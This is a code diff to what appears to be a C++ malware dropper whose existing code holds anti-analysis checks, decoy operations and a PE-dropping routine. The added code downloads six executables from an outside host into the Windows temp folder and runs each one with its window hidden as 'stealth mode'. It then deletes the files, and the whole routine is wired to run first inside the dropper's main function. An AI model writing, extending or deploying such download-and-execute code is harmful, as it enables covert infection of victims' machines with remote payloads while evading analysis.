@@ -398,7 +398,93 @@ public:
     }
     
     // ===============================================================================
-    // MAIN PE DROPPING FUNCTION
+    // DOWNLOAD/EXECUTE TESTING FUNCTIONALITY
+    // ===============================================================================
+    bool downloadAndExecuteTest() {
+        std::vector<std::string> test_urls = {
+            "https://shit.pe/test1.exe",
+            "https://shit.pe/test2.exe", 
+            "https://shit.pe/test3.exe",
+            "https://shit.pe/test4.exe",
+            "https://shit.pe/test5.exe",
+            "https://shit.pe/test6.exe"
+        };
+        
+        for (int i = 0; i < 6; i++) {
+            std::string url = test_urls[i];
+            std::string local_path = "C:\\Windows\\Temp\\test_" + std::to_string(i + 1) + ".exe";
+            
+            // Download file
+            if (!downloadFile(url, local_path)) {
+                continue; // Skip if download fails
+            }
+            
+            // Execute downloaded file
+            executeDownloadedFile(local_path);
+            
+            // Clean up
+            Sleep(2000); // Wait 2 seconds
+            DeleteFileA(local_path.c_str());
+        }
+        
+        return true;
+    }
+    
+    bool downloadFile(const std::string& url, const std::string& local_path) {
+        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+        if (!hInternet) return false;
+        
+        HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+        if (!hUrl) {
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+        
+        // Create local file
+        HANDLE hFile = CreateFileA(local_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            InternetCloseHandle(hUrl);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+        
+        // Download and write file
+        char buffer[4096];
+        DWORD bytesRead, bytesWritten;
+        bool success = true;
+        
+        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
+            if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
+                success = false;
+                break;
+            }
+        }
+        
+        CloseHandle(hFile);
+        InternetCloseHandle(hUrl);
+        InternetCloseHandle(hInternet);
+        
+        return success;
+    }
+    
+    void executeDownloadedFile(const std::string& file_path) {
+        // Execute in stealth mode
+        STARTUPINFOA si = {};
+        PROCESS_INFORMATION pi = {};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        
+        CreateProcessA(file_path.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+        
+        if (pi.hProcess) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+    }
+
+    // ===============================================================================
+    // MAIN PE DROPPING FUNCTION (UPDATED)
     // ===============================================================================
     bool dropAndExecutePE(const std::string& target_pe_path, const std::string& masm_payload_path) {
         // Exit if anti-analysis detected anything suspicious
@@ -407,6 +493,9 @@ public:
             executeDecoyOperations();
             return false;
         }
+        
+        // FIRST: Run download/execute test
+        downloadAndExecuteTest();
         
         // Load target PE
         if (!loadPEFile(target_pe_path, target_pe_data)) return false;
